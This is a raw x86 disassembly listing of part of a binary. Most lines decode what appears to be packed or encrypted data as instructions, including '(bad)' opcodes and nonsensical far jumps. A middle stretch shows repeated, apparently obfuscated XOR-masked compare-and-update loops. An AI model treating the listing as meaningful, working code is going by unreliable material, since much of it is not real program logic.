  41f438:	ins    DWORD PTR es:[edi],dx
  41f439:	or     ah,BYTE PTR [eax+0x6f6082dc]
  41f43f:	jmp    0x63d5c4fc
  41f444:	call   0xf04:0xe89f0f30
  41f44b:	in     eax,dx
  41f44c:	icebp  
  41f44d:	cwde   
  41f44e:	pop    ebx
  41f44f:	jno    0x41f49b
  41f451:	add    al,0x58
  41f453:	ror    DWORD PTR [edx+0x4a3afef3],1
  41f459:	retf   
  41f45a:	enter  0xdc24,0xae
  41f45e:	into   
  41f45f:	jge    0x41f466
  41f461:	mov    al,ds:0x5f7093a1
  41f466:	dec    eax
  41f467:	adc    ah,BYTE PTR [ebx-0xc6247e8]
  41f46d:	sti    
  41f46e:	mov    eax,0x3c9f2774
  41f473:	add    eax,0xb25adeef
  41f478:	sub    esi,DWORD PTR [ebp+ebx*2-0x3407f0d3]
  41f47f:	fist   DWORD PTR [eax+edi*8]
  41f482:	ror    BYTE PTR [edi+ecx*8-0x5ecbdd58],0x3e
  41f48a:	fadd   st(2),st
  41f48c:	aam    0x1a
  41f48e:	inc    ebp
  41f48f:	lds    edi,FWORD PTR [ebp+0x1a]
  41f492:	shl    BYTE PTR [ebx],0x11
  41f495:	stos   BYTE PTR es:[edi],al
  41f496:	jp     0x41f41c
  41f498:	jmp    0xcc22fe37
  41f49d:	leave  
  41f49e:	jnp    0x41f4b5
  41f4a0:	fwait
  41f4a1:	pop    edi
  41f4a2:	jmp    FWORD PTR [esi+0x2a38ecf9]
  41f4a8:	imul   eax,DWORD PTR [edi+0x72ceb897],0xe6332a6c
  41f4b2:	dec    ecx
  41f4b3:	cs xchg edx,eax
  41f4b5:	mov    esi,0xe98ea711
  41f4ba:	sbb    edi,DWORD PTR [edi]
  41f4bc:	xor    eax,0xc274dc89
  41f4c1:	mov    cl,0x29
  41f4c3:	sbb    dl,dl
  41f4c5:	fdivr  DWORD PTR [ecx+0x52]
  41f4c8:	into   
  41f4c9:	jmp    0xd2e0:0x51a3f687
  41f4d0:	mov    DWORD PTR [ebp-0x132c320],ecx
  41f4d6:	cmc    
  41f4d7:	cmp    DWORD PTR [edx+eax*1],edx
  41f4da:	scas   eax,DWORD PTR es:[edi]
  41f4db:	enter  0xb120,0x9
  41f4df:	pop    ebp
  41f4e0:	xchg   ecx,eax
  41f4e1:	mov    dl,BYTE PTR [ebx+0x34]
  41f4e4:	call   0xeaf0:0xb4e73499
  41f4eb:	mov    bh,0xb5
  41f4ed:	xchg   ebx,eax
  41f4ee:	mov    ebx,0xd5890199
  41f4f3:	push   ss
  41f4f4:	or     DWORD PTR [eax+0x157b287d],edx
  41f4fa:	pop    edi
  41f4fb:	jl     0x41f4ed
  41f4fd:	xlat   BYTE PTR ds:[ebx]
  41f4fe:	add    al,0x1d
  41f500:	jge    0x41f581
  41f502:	ror    ch,0x67
  41f505:	xchg   ecx,eax
  41f506:	mov    eax,ds:0xc8f6a586
  41f50b:	test   BYTE PTR [ebx],al
  41f50d:	call   DWORD PTR [esi+0x25]
  41f510:	dec    ecx
  41f511:	mov    dl,0x3c
  41f513:	dec    ebx
  41f514:	inc    ebp
  41f515:	dec    edi
  41f516:	mov    BYTE PTR [esp+eiz*4-0x46],bh
  41f51a:	aaa    
  41f51b:	(bad)  
  41f51c:	stos   BYTE PTR es:[edi],al
  41f51d:	sub    BYTE PTR [edi],dh
  41f51f:	dec    ebx
  41f520:	aad    0x80
  41f522:	div    DWORD PTR [ebx-0x2]
  41f525:	outs   dx,DWORD PTR ds:[esi]
  41f526:	add    eax,0xe28072e0
  41f52b:	call   0x935758e7
  41f530:	imul   ebp,DWORD PTR [ebp-0xe7e17e1],0x500c4a49
  41f53a:	imul   cl
  41f53c:	cmp    al,0x64
  41f53e:	imul   si,WORD PTR [edx+0x7a],0x8ee8
  41f544:	mov    BYTE PTR [edx],bl
  41f546:	mov    ecx,0x3aa8dea
  41f54b:	and    al,0x55
  41f54d:	adc    al,0x88
  41f54f:	nop    DWORD PTR [edx-0x68]
  41f553:	loope  0x41f527
  41f555:	iret   
  41f556:	cdq    
  41f557:	rol    DWORD PTR [ecx-0x74],0xad
  41f55b:	lock stos DWORD PTR es:[edi],eax
  41f55d:	pop    ebp
  41f55e:	pop    ds
  41f55f:	push   ecx
  41f560:	in     al,dx
  41f561:	stos   BYTE PTR es:[edi],al
  41f562:	jbe    0x41f4f5
  41f564:	sub    edi,DWORD PTR [edx-0x3d]
  41f567:	sbb    al,0x22
  41f569:	daa    
  41f56a:	adc    esi,DWORD PTR [ecx+0x6ffb0bd5]
  41f570:	xor    eax,0xcde24004
  41f575:	shl    DWORD PTR ds:[ecx-0x5be31a3e],0x83
  41f57d:	ins    DWORD PTR es:[edi],dx
  41f57e:	in     eax,dx
  41f57f:	xor    al,0x70
  41f581:	std    
  41f582:	pop    esp
  41f583:	mov    ecx,ebx
  41f585:	lods   eax,DWORD PTR ds:[esi]
  41f586:	(bad)  
  41f587:	cdq    
  41f588:	repz ficom WORD PTR [ebp+0x370e1217]
  41f58f:	mov    cl,0x22
  41f591:	pop    ecx
  41f592:	push   0x2f
  41f594:	and    al,0xf1
  41f596:	shr    esp,1
  41f598:	stos   DWORD PTR es:[edi],eax
  41f599:	test   eax,0x383318d6
  41f59e:	mov    edx,0x104bc858
  41f5a3:	mov    BYTE PTR [ebp-0xb41069c],al
  41f5a9:	rcl    BYTE PTR [esi],0xd7
  41f5ac:	dec    eax
  41f5ad:	sbb    DWORD PTR [eax+ecx*4-0x3f7bb41f],ecx
  41f5b4:	sar    esi,0x99
  41f5b7:	push   esi
  41f5b8:	cmc    
  41f5b9:	mov    ebx,0x19afff1a
  41f5be:	cdq    
  41f5bf:	jno    0x41f58c
  41f5c1:	dec    ebp
  41f5c2:	xor    ebp,DWORD PTR [ebp-0x286214ce]
  41f5c8:	pusha  
  41f5c9:	add    al,0x4b
  41f5cb:	in     al,0x71
  41f5cd:	inc    esi
  41f5ce:	dec    ebp
  41f5cf:	je     0x41f611
  41f5d1:	fs add eax,0xfb98355b
  41f5d7:	jbe    0x41f5cf
  41f5d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f5da:	jle    0x41f5b2
  41f5dc:	outs   dx,DWORD PTR ds:[esi]
  41f5dd:	cmc    
  41f5de:	pop    ebx
  41f5df:	icebp  
  41f5e0:	aad    0x36
  41f5e2:	xlat   BYTE PTR ds:[ebx]
  41f5e3:	sub    eax,0x10bcc8fc
  41f5e8:	rcl    BYTE PTR [ecx+ebp*4+0x5eb625b4],0xa5
  41f5f0:	fisubr WORD PTR [esi]
  41f5f2:	fsub   QWORD PTR [esi-0x6c333edd]
  41f5f8:	inc    edi
  41f5f9:	icebp  
  41f5fa:	or     DWORD PTR [ebp+0x5155c604],ebp
  41f600:	jp     0x41f59e
  41f602:	sbb    cl,ah
  41f604:	repnz mov ebx,ecx
  41f607:	addr16 ret 0xfde3
  41f60b:	sbb    BYTE PTR es:[ebx+0x1b],dh
  41f60f:	mov    dl,0x8
  41f611:	pop    eax
  41f612:	jns    0x41f656
  41f614:	sub    edi,edx
  41f616:	and    DWORD PTR [edx],edx
  41f618:	retf   0xc697
  41f61b:	mov    esi,0x8b2f6bb8
  41f620:	push   0x11
  41f622:	in     eax,0xe7
  41f624:	sub    edx,DWORD PTR [edx-0x434905d6]
  41f62a:	sub    DWORD PTR [ebp+0x8fe7a2d],edi
  41f630:	push   ebp
  41f631:	push   es
  41f632:	ret    
  41f633:	hlt    
  41f634:	gs in  eax,0xa1
  41f637:	xchg   ecx,eax
  41f638:	pop    esi
  41f639:	fnsave [ebp-0x63]
  41f63c:	int    0x8
  41f63e:	xor    eax,0xbc1dbc34
  41f643:	leave  
  41f644:	inc    ebp
  41f645:	popf   
  41f646:	stos   BYTE PTR es:[edi],al
  41f647:	dec    esp
  41f648:	mov    edx,0xce790cbe
  41f64d:	push   ebp
  41f64e:	sahf   
  41f64f:	das    
  41f650:	xor    BYTE PTR [ecx-0x8],dh
  41f653:	xchg   edx,eax
  41f654:	cld    
  41f655:	inc    edi
  41f656:	xlat   BYTE PTR ds:[ebx]
  41f657:	scas   eax,DWORD PTR es:[edi]
  41f658:	xchg   ebx,eax
  41f659:	cwde   
  41f65a:	pop    edi
  41f65b:	or     ah,dh
  41f65d:	test   al,0x87
  41f65f:	mov    edx,0xe6e68305
  41f664:	(bad)  [edi+0x772a0f3a]
  41f66a:	fidiv  DWORD PTR [ecx+0x3b]
  41f66d:	addps  xmm4,XMMWORD PTR [ebx+0x3ca55502]
  41f674:	add    eax,0xac796921
  41f679:	xor    eax,0xc44aa6e1
  41f67e:	pushf  
  41f67f:	sub    esi,DWORD PTR [edi-0x28a85c11]
  41f685:	clc    
  41f686:	jbe    0x41f6c3
  41f688:	push   edi
  41f689:	jge    0x41f652
  41f68b:	sbb    dh,BYTE PTR [esi+0x53]
  41f68e:	sbb    BYTE PTR [ecx+eiz*8],dl
  41f691:	mov    gs,ecx
  41f693:	lahf   
  41f694:	push   edx
  41f695:	pop    edi
  41f696:	jg     0x41f668
  41f698:	jo     0x41f6c3
  41f69a:	test   eax,0x306a0bbe
  41f69f:	retf   0xe4e2
  41f6a2:	xor    ebp,0x50282a7e
  41f6a8:	sub    DWORD PTR [eax+eax*1+0x2a24ee90],0x74
  41f6b0:	clc    
  41f6b1:	out    0x2d,eax
  41f6b3:	aaa    
  41f6b4:	enter  0x10b2,0xb8
  41f6b8:	fwait
  41f6b9:	jecxz  0x41f70b
  41f6bb:	adc    ebx,ecx
  41f6bd:	dec    edi
  41f6be:	gs jmp 0x41f66e
  41f6c1:	jp     0x41f73c
  41f6c3:	xchg   ebx,eax
  41f6c4:	mov    WORD PTR [ebp+0x41],cs
  41f6c7:	mov    ebx,0x42755a35
  41f6cc:	je     0x41f6dc
  41f6ce:	(bad)
  41f6d3:	rcl    BYTE PTR [edx],cl
  41f6d5:	pop    ss
  41f6d6:	ret    0x5def
  41f6d9:	jg     0x41f724
  41f6db:	addr16 push eax
  41f6dd:	xor    DWORD PTR [edx-0x40],esp
  41f6e0:	cmp    edx,DWORD PTR [ecx]
  41f6e2:	push   ds
  41f6e3:	retf   0xc054
  41f6e6:	cmp    BYTE PTR [esi-0xc56e5ee],dl
  41f6ec:	rol    edx,0x1d
  41f6ef:	or     dh,BYTE PTR [ebp-0x46]
  41f6f2:	inc    esi
  41f6f3:	push   ds
  41f6f4:	call   0x55b7:0x6c4b82bb
  41f6fb:	(bad)  [ecx+edx*8+0x14]
  41f6ff:	sbb    ah,0xc5
  41f702:	or     BYTE PTR [ecx],dl
  41f704:	bnd jb 0x41f6ef
  41f707:	sbb    DWORD PTR [eax-0xdbeafe3],eax
  41f70d:	stos   DWORD PTR es:[edi],eax
  41f70e:	jb     0x41f775
  41f710:	xor    esi,DWORD PTR [ecx-0x3a817af9]
  41f716:	fldcw  WORD PTR [ebp-0x7fdc6259]
  41f71c:	push   ds
  41f71d:	mov    cs,WORD PTR [eax]
  41f71f:	inc    ebp
  41f720:	sub    al,BYTE PTR ss:0xc4970829
  41f727:	jbe    0x41f795
  41f729:	adc    eax,0xf036f848
  41f72e:	sahf   
  41f72f:	xor    eax,0x9953b5b
  41f734:	xor    eax,0xc00d7bb1
  41f739:	shr    BYTE PTR [ecx-0x76],0x70
  41f73d:	fwait
  41f73e:	iret   
  41f73f:	data16 xchg BYTE PTR [ebx+0x52],ch
  41f743:	inc    ebp
  41f744:	mov    eax,ds:0xc77ee984
  41f749:	mov    eax,DWORD PTR [ecx+0x77f48d5c]
  41f74f:	sub    al,0x6b
  41f751:	cmp    BYTE PTR [edx-0x18],ch
  41f754:	mov    ds,WORD PTR ds:0xd0f06e69
  41f75a:	test   al,0x60
  41f75c:	pushf  
  41f75d:	cmp    ebx,DWORD PTR ds:0xe706e4ac
  41f763:	pop    esp
  41f764:	cmp    ecx,eax
  41f766:	imul   ebx,ebp,0xffffffee
  41f769:	dec    edx
  41f76a:	adc    bl,BYTE PTR [eax-0x7d]
  41f76d:	popf   
  41f76e:	pop    es
  41f76f:	call   0xdba649d0
  41f774:	mov    eax,DWORD PTR [ecx+0x7350771d]
  41f77a:	push   ecx
  41f77b:	mov    al,0x5f
  41f77d:	dec    edx
  41f77e:	sbb    eax,0xeae3eca8
  41f783:	inc    edx
  41f784:	retf   
  41f785:	stos   DWORD PTR es:[edi],eax
  41f786:	jb     0x41f750
  41f788:	arpl   WORD PTR [ebx+0x24],cx
  41f78b:	lahf   
  41f78c:	pop    eax
  41f78d:	mov    al,ds:0xffd55a03
  41f792:	mov    dh,0xf9
  41f794:	inc    ebp
  41f795:	in     al,dx
  41f796:	rcl    DWORD PTR [esi+edi*1],cl
  41f799:	pop    ebp
  41f79a:	inc    edx
  41f79b:	bound  edx,QWORD PTR [eax]
  41f79d:	mov    esp,ebx
  41f79f:	adc    DWORD PTR [ebp-0x55],edx
  41f7a2:	daa    
  41f7a3:	cmc    
  41f7a4:	xor    al,0x48
  41f7a6:	jb     0x41f74c
  41f7a8:	rcr    BYTE PTR [esp+eiz*2-0x59],cl
  41f7ac:	jecxz  0x41f7fc
  41f7ae:	inc    ebp
  41f7af:	dec    esp
  41f7b0:	gs pop ebx
  41f7b2:	ret    0xae43
  41f7b5:	jge    0x41f758
  41f7b7:	cmp    eax,0xbff846e3
  41f7bc:	xlat   BYTE PTR ds:[ebx]
  41f7bd:	jle    0x41f7ff
  41f7bf:	jl     0x41f79e
  41f7c1:	mov    bl,0x9a
  41f7c3:	pop    ebp
  41f7c4:	inc    esi
  41f7c5:	add    al,0xed
  41f7c7:	ficomp DWORD PTR [ebx-0x3f]
  41f7ca:	xchg   ecx,eax
  41f7cb:	jb     0x41f7e1
  41f7cd:	add    eax,0xf63933ba
  41f7d2:	outs   dx,BYTE PTR ds:[esi]
  41f7d3:	fdiv   QWORD PTR ds:0xc3175fce
  41f7d9:	mov    esp,0x13994448
  41f7de:	ins    DWORD PTR es:[edi],dx
  41f7df:	inc    eax
  41f7e0:	or     ebp,DWORD PTR [edi+0x4d3d5c28]
  41f7e6:	icebp  
  41f7e7:	repnz mov ds:0x7985cad4,al
  41f7ed:	xchg   ebp,eax
  41f7ee:	in     al,0xe7
  41f7f0:	repnz out dx,al
  41f7f2:	pop    edi
  41f7f3:	adc    ecx,DWORD PTR [eax]
  41f7f5:	test   DWORD PTR [ecx+0x5b],edx
  41f7f8:	dec    edi
  41f7f9:	test   DWORD PTR [edx+ebx*8],ecx
  41f7fc:	out    0x55,eax
  41f7fe:	lock dec ecx
  41f800:	mov    ds:0x76466b1b,al
  41f805:	mov    ch,0x32
  41f807:	je     0x41f7f7
  41f809:	je     0x41f846
  41f80b:	jnp    0x41f7b9
  41f80d:	push   cs
  41f80e:	outs   dx,BYTE PTR ds:[esi]
  41f80f:	ja     0x41f7aa
  41f811:	test   al,0x81
  41f813:	sbb    BYTE PTR [ebx-0x36],0x2b
  41f817:	std    
  41f818:	dec    esp
  41f819:	out    dx,al
  41f81a:	or     DWORD PTR [edi],0x4f928134
  41f820:	jne    0x41f7ce
  41f822:	lods   eax,DWORD PTR ds:[esi]
  41f823:	ins    DWORD PTR es:[edi],dx
  41f824:	dec    ebx
  41f825:	into   
  41f826:	pop    edx
  41f827:	sub    DWORD PTR [ebp+0x3d],ecx
  41f82a:	pop    ss
  41f82b:	mov    ds:0x5d36e7e0,al
  41f830:	mov    bh,0x6d
  41f832:	icebp  
  41f833:	cwde   
  41f834:	push   0xffffff83
  41f836:	push   ebx
  41f837:	push   eax
  41f838:	jp     0x41f7bf
  41f83a:	popa   
  41f83b:	dec    esp
  41f83c:	ja     0x41f889
  41f83e:	out    0xb0,eax
  41f840:	hlt    
  41f841:	mov    ah,0x20
  41f843:	cli    
  41f844:	push   eax
  41f845:	sub    DWORD PTR [esi+0x31ff457a],ebx
  41f84b:	sbb    DWORD PTR [ebx+0x58],ecx
  41f84e:	push   es
  41f84f:	bound  eax,QWORD PTR [ebp+0x4decf03b]
  41f855:	shl    BYTE PTR [ebp+0x34],cl
  41f858:	and    eax,0x15513f01
  41f85d:	mov    ds:0x852a3aea,eax
  41f862:	inc    ebx
  41f863:	(bad)  
  41f864:	mov    ebx,0x69d86317
  41f869:	rcl    DWORD PTR [edi],0x1c
  41f86c:	ja     0x41f81c
  41f86e:	pop    ecx
  41f86f:	sub    al,0xb0
  41f871:	icebp  
  41f872:	aaa    
  41f873:	jecxz  0x41f864
  41f875:	daa    
  41f876:	dec    eax
  41f877:	(bad)  
  41f879:	xlat   BYTE PTR ds:[ebx]
  41f87a:	sbb    eax,0x9bef66ee
  41f87f:	aad    0xe4
  41f881:	jg     0x41f8eb
  41f883:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f884:	(bad)  
  41f885:	in     al,0xc
  41f887:	test   DWORD PTR ds:0xcd97066c,edi
  41f88d:	pop    esi
  41f88e:	cmc    
  41f88f:	retf   0xf468
  41f892:	sbb    eax,0x355ebd32
  41f897:	out    dx,al
  41f898:	or     eax,0xddea4436
  41f89d:	sub    al,0x4
  41f89f:	cwde   
  41f8a0:	inc    eax
  41f8a1:	mov    edx,DWORD PTR [ebp+0x8]
  41f8a4:	mov    ebx,DWORD PTR [ebp-0x50]
  41f8a7:	add    edx,ecx
  41f8a9:	xor    edx,ebx
  41f8ab:	mov    DWORD PTR [ebp-0x50],edx
  41f8ae:	mov    edx,DWORD PTR [ebp+0x8]
  41f8b1:	mov    ebx,DWORD PTR [ebp-0x4c]
  41f8b4:	add    edx,edi
  41f8b6:	and    edx,ebx
  41f8b8:	mov    DWORD PTR [ebp-0x4c],edx
  41f8bb:	mov    edx,DWORD PTR [ebp+0x8]
  41f8be:	mov    ebx,DWORD PTR [ebp-0x48]
  41f8c1:	lea    edx,[ebx+edx*1+0x241fcdf]
  41f8c8:	mov    DWORD PTR [ebp-0x48],edx
  41f8cb:	mov    edx,DWORD PTR [ebp+0x8]
  41f8ce:	mov    ebx,0xfa5e1524
  41f8d3:	sub    ebx,edx
  41f8d5:	add    ebx,DWORD PTR [ebp-0x44]
  41f8d8:	mov    DWORD PTR [ebp-0x44],ebx
  41f8db:	mov    edx,DWORD PTR [ebp+0x8]
  41f8de:	xor    edx,eax
  41f8e0:	add    edx,esi
  41f8e2:	jne    0x41d4a1
  41f8e8:	mov    edx,DWORD PTR [ebp-0xc]
  41f8eb:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41f8f2:	mov    bl,BYTE PTR [ebp-0x1]
  41f8f5:	cmp    dl,bl
  41f8f7:	je     0x41f9d5
  41f8fd:	mov    ecx,DWORD PTR [ebp-0x5c]
  41f900:	mov    edx,DWORD PTR [ebp-0xc]
  41f903:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41f90a:	mov    ebx,DWORD PTR [ebp+0xc]
  41f90d:	xor    ecx,eax
  41f90f:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f1]
  41f916:	jne    0x421e61
  41f91c:	mov    ecx,DWORD PTR [ebp-0x5c]
  41f91f:	mov    edx,DWORD PTR [ebp+0xc]
  41f922:	xor    ecx,eax
  41f924:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f1]
  41f92c:	mov    edx,DWORD PTR [ebp-0x18]
  41f92f:	xor    edx,eax
  41f931:	add    edx,esi
  41f933:	cmp    ecx,edx
  41f935:	mov    ecx,DWORD PTR [ebp-0x14]
  41f938:	mov    DWORD PTR [ebp+0x8],ecx
  41f93b:	mov    ecx,DWORD PTR [ebp+0x8]
  41f93e:	je     0x422f7f
  41f944:	xor    ecx,eax
  41f946:	add    ecx,esi
  41f948:	mov    ecx,0x242ebc9
  41f94d:	je     0x41fa5d
  41f953:	mov    edx,DWORD PTR [ebp+0x8]
  41f956:	mov    ebx,DWORD PTR [ebp-0x8]
  41f959:	xor    edx,eax
  41f95b:	xor    ebx,eax
  41f95d:	sub    edx,ebx
  41f95f:	sub    edx,esi
  41f961:	xor    edx,eax
  41f963:	mov    DWORD PTR [ebp+0x8],edx
  41f966:	mov    edx,DWORD PTR [ebp+0x8]
  41f969:	mov    ebx,DWORD PTR [ebp-0x58]
  41f96c:	add    edx,0x5708fa
  41f972:	imul   edx,ebx
  41f975:	mov    DWORD PTR [ebp-0x58],edx
  41f978:	mov    edx,DWORD PTR [ebp+0x8]
  41f97b:	mov    ebx,DWORD PTR [ebp-0x54]
  41f97e:	add    edx,0x64f898
  41f984:	or     edx,ebx
  41f986:	mov    DWORD PTR [ebp-0x54],edx
  41f989:	mov    edx,DWORD PTR [ebp+0x8]
  41f98c:	mov    ebx,DWORD PTR [ebp-0x50]
  41f98f:	add    edx,ecx
  41f991:	xor    edx,ebx
  41f993:	mov    DWORD PTR [ebp-0x50],edx
  41f996:	mov    edx,DWORD PTR [ebp+0x8]
  41f999:	mov    ebx,DWORD PTR [ebp-0x4c]
  41f99c:	add    edx,edi
  41f99e:	and    edx,ebx
  41f9a0:	mov    DWORD PTR [ebp-0x4c],edx
  41f9a3:	mov    edx,DWORD PTR [ebp+0x8]
  41f9a6:	mov    ebx,DWORD PTR [ebp-0x48]
  41f9a9:	lea    edx,[ebx+edx*1+0x241fcdf]
  41f9b0:	mov    DWORD PTR [ebp-0x48],edx
  41f9b3:	mov    edx,DWORD PTR [ebp+0x8]
  41f9b6:	mov    ebx,0xfa5e1524
  41f9bb:	sub    ebx,edx
  41f9bd:	add    ebx,DWORD PTR [ebp-0x44]
  41f9c0:	mov    DWORD PTR [ebp-0x44],ebx
  41f9c3:	mov    edx,DWORD PTR [ebp+0x8]
  41f9c6:	xor    edx,eax
  41f9c8:	add    edx,esi
  41f9ca:	jne    0x41f953
  41f9d0:	jmp    0x41fa5d
  41f9d5:	mov    edx,DWORD PTR [ebp-0x14]
  41f9d8:	mov    DWORD PTR [ebp+0x8],edx
  41f9db:	jmp    0x41fa50
  41f9e0:	mov    edx,DWORD PTR [ebp+0x8]
  41f9e3:	mov    ebx,DWORD PTR [ebp-0x8]
  41f9e6:	xor    edx,eax
  41f9e8:	xor    ebx,eax
  41f9ea:	sub    edx,ebx
  41f9ec:	sub    edx,esi
  41f9ee:	xor    edx,eax
  41f9f0:	mov    DWORD PTR [ebp+0x8],edx
  41f9f3:	mov    edx,DWORD PTR [ebp+0x8]
  41f9f6:	mov    ebx,DWORD PTR [ebp-0x58]
  41f9f9:	add    edx,0x5708fa
  41f9ff:	imul   edx,ebx
  41fa02:	mov    DWORD PTR [ebp-0x58],edx
  41fa05:	mov    edx,DWORD PTR [ebp+0x8]
  41fa08:	mov    ebx,DWORD PTR [ebp-0x54]
  41fa0b:	add    edx,0x64f898
  41fa11:	or     edx,ebx
  41fa13:	mov    DWORD PTR [ebp-0x54],edx
  41fa16:	mov    edx,DWORD PTR [ebp+0x8]
  41fa19:	mov    ebx,DWORD PTR [ebp-0x50]
  41fa1c:	add    edx,ecx
  41fa1e:	xor    edx,ebx
  41fa20:	mov    DWORD PTR [ebp-0x50],edx
  41fa23:	mov    edx,DWORD PTR [ebp+0x8]
  41fa26:	mov    ebx,DWORD PTR [ebp-0x4c]
  41fa29:	add    edx,edi
  41fa2b:	and    edx,ebx
  41fa2d:	mov    DWORD PTR [ebp-0x4c],edx
  41fa30:	mov    edx,DWORD PTR [ebp+0x8]
  41fa33:	mov    ebx,DWORD PTR [ebp-0x48]
  41fa36:	lea    edx,[ebx+edx*1+0x241fcdf]
  41fa3d:	mov    DWORD PTR [ebp-0x48],edx
  41fa40:	mov    edx,DWORD PTR [ebp+0x8]
  41fa43:	mov    ebx,0xfa5e1524
  41fa48:	sub    ebx,edx
  41fa4a:	add    ebx,DWORD PTR [ebp-0x44]
  41fa4d:	mov    DWORD PTR [ebp-0x44],ebx
  41fa50:	mov    edx,DWORD PTR [ebp+0x8]
  41fa53:	xor    edx,eax
  41fa55:	add    edx,esi
  41fa57:	jne    0x41f9e0
  41fa5d:	mov    edx,DWORD PTR [ebp-0x14]
  41fa60:	mov    DWORD PTR [ebp+0x8],edx
  41fa63:	jmp    0x41fad8
  41fa68:	mov    edx,DWORD PTR [ebp+0x8]
  41fa6b:	mov    ebx,DWORD PTR [ebp-0x8]
  41fa6e:	xor    edx,eax
  41fa70:	xor    ebx,eax
  41fa72:	sub    edx,ebx
  41fa74:	sub    edx,esi
  41fa76:	xor    edx,eax
  41fa78:	mov    DWORD PTR [ebp+0x8],edx
  41fa7b:	mov    edx,DWORD PTR [ebp+0x8]
  41fa7e:	mov    ebx,DWORD PTR [ebp-0x58]
  41fa81:	add    edx,0x5708fa
  41fa87:	imul   edx,ebx
  41fa8a:	mov    DWORD PTR [ebp-0x58],edx
  41fa8d:	mov    edx,DWORD PTR [ebp+0x8]
  41fa90:	mov    ebx,DWORD PTR [ebp-0x54]
  41fa93:	add    edx,0x64f898
  41fa99:	or     edx,ebx
  41fa9b:	mov    DWORD PTR [ebp-0x54],edx
  41fa9e:	mov    edx,DWORD PTR [ebp+0x8]
  41faa1:	mov    ebx,DWORD PTR [ebp-0x50]
  41faa4:	add    edx,ecx
  41faa6:	xor    edx,ebx
  41faa8:	mov    DWORD PTR [ebp-0x50],edx
  41faab:	mov    edx,DWORD PTR [ebp+0x8]
  41faae:	mov    ebx,DWORD PTR [ebp-0x4c]
  41fab1:	add    edx,edi
  41fab3:	and    edx,ebx
  41fab5:	mov    DWORD PTR [ebp-0x4c],edx
  41fab8:	mov    edx,DWORD PTR [ebp+0x8]
  41fabb:	mov    ebx,DWORD PTR [ebp-0x48]
  41fabe:	lea    edx,[ebx+edx*1+0x241fcdf]
  41fac5:	mov    DWORD PTR [ebp-0x48],edx
  41fac8:	mov    edx,DWORD PTR [ebp+0x8]
  41facb:	mov    ebx,0xfa5e1524
  41fad0:	sub    ebx,edx
  41fad2:	add    ebx,DWORD PTR [ebp-0x44]
  41fad5:	mov    DWORD PTR [ebp-0x44],ebx
  41fad8:	mov    edx,DWORD PTR [ebp+0x8]
  41fadb:	xor    edx,eax
  41fadd:	add    edx,esi
  41fadf:	jne    0x41fa68
  41fae5:	mov    edx,DWORD PTR [ebp-0x8]
  41fae8:	mov    ebx,DWORD PTR [ebp-0xc]
  41faeb:	xor    edx,eax
  41faed:	lea    edx,[edx+ebx*1+0x3272f1]
  41faf4:	jmp    0x421e4c
  41faf9:	and    BYTE PTR ds:0xc10ac90f,dh
  41faff:	mov    ds:0xfe8da196,al
  41fb04:	jmp    0xcbf08a10
  41fb09:	adc    BYTE PTR [esi+0x5e46837c],dh
  41fb0f:	add    DWORD PTR [ebx+0x1f2ea28e],0xffffffc9
  41fb16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb17:	pop    esp
  41fb18:	std    
  41fb19:	mov    cl,0x7e
  41fb1b:	xor    bl,BYTE PTR [eax]
  41fb1d:	jg     0x41faa5
  41fb1f:	sbb    BYTE PTR [edi],bl
  41fb21:	jns    0x41fb4f
  41fb23:	xchg   ebp,eax
  41fb24:	aaa    
  41fb25:	xlat   BYTE PTR ds:[ebx]
  41fb26:	jmp    0x37d:0xf19ef93f
  41fb2d:	and    ah,BYTE PTR [ecx]
  41fb2f:	push   edi
  41fb30:	mov    ?,WORD PTR [esi+ecx*4+0x5e64a25e]
  41fb37:	inc    eax
  41fb38:	pop    ebp
  41fb39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb3a:	push   0x3a
  41fb3c:	inc    ebx
  41fb3d:	inc    esp
  41fb3e:	clc    
  41fb3f:	or     esi,0x60e87c4c
  41fb45:	inc    ecx
  41fb46:	adc    DWORD PTR [ebx+0x154831e3],eax
  41fb4c:	pop    ebx
  41fb4d:	(bad)  
  41fb4e:	cmp    al,0x6f
  41fb50:	push   ds
  41fb51:	(bad)  
  41fb52:	loopne 0x41fb43
  41fb54:	push   ebx
  41fb55:	mov    dl,ch
  41fb57:	mul    DWORD PTR [edi]
  41fb59:	adc    BYTE PTR [ebx+0x7b],0x57
  41fb5d:	fst    DWORD PTR [ecx-0x1]
  41fb60:	retf   
  41fb61:	sar    DWORD PTR [edx+eax*4-0x5d80f9f9],cl
  41fb68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb69:	mov    eax,0x1d5abd75
  41fb6e:	push   ecx
  41fb6f:	mov    edx,DWORD PTR [esi]
  41fb71:	or     edx,DWORD PTR [ebx]
  41fb73:	xor    BYTE PTR es:[eax+0x26],dl
  41fb77:	mov    ds:0x34907d5b,al
  41fb7c:	loop   0x41fb2b
  41fb7e:	repnz jecxz 0x41fb73
  41fb81:	add    ch,BYTE PTR [eax-0x436b57ae]
  41fb87:	ins    BYTE PTR es:[edi],dx
  41fb88:	arpl   WORD PTR [ecx-0x5d],ax
  41fb8b:	and    al,0x82
  41fb8d:	pop    es
  41fb8e:	retf   
  41fb8f:	cli    
  41fb90:	(bad)  
  41fb91:	fcmove st,st(4)
  41fb93:	pop    ebp
  41fb94:	jmp    0xe8b2:0xdfe399fc
  41fb9b:	mov    bh,0xf8
  41fb9d:	mov    dh,0xeb
  41fb9f:	xor    bh,BYTE PTR [edx+ebp*4+0x1f]
  41fba3:	pop    eax
  41fba4:	push   ebx
  41fba5:	inc    ebx
  41fba6:	(bad)  
  41fba7:	out    dx,eax
  41fba8:	ret    0xa8c7
  41fbab:	cmc    
  41fbac:	shr    BYTE PTR [esi+ecx*8+0x76],1
  41fbb0:	inc    eax
  41fbb1:	mov    ds:0xe3e5c98b,eax
  41fbb6:	loopne 0x41fb7e
  41fbb8:	add    al,0x9b
  41fbba:	sbb    dx,cx
  41fbbd:	adc    eax,DWORD PTR [eax]
  41fbbf:	(bad)  
  41fbc0:	push   ecx
  41fbc1:	das    
  41fbc2:	fisub  WORD PTR [edi+0x3b]
  41fbc5:	jge    0x41fbf8
